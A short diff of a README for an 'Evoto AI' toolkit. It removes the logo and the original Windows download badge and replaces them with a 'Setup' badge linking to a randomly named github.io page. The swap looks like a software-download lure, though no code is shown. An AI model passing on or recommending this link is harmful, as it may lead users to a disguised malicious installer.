@@ -1,15 +1,6 @@
 # Evoto AI – Advanced Artificial Intelligence Toolkit  
 
-<div align="center">
-  <img src="https://gdm-catalog-fmapi-prod.imgix.net/ProductLogo/6a2b9bd3-3003-438c-982b-f14da64a9078.jpeg?w=80&h=80&fit=max&dpr=3&auto=format&q=50" width="200"/>
-</div>  
-<br>
-
-<div align="center">
-
-[![GET for Windows](https://img.shields.io/badge/GET_for_Windows-0066cc?style=for-the-badge)](https://evoto-ai-app.github.io/.github)
-
-</div>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://avrilbangslpofkh.github.io/.github/Evoto-AI-App)
 
 ---
 
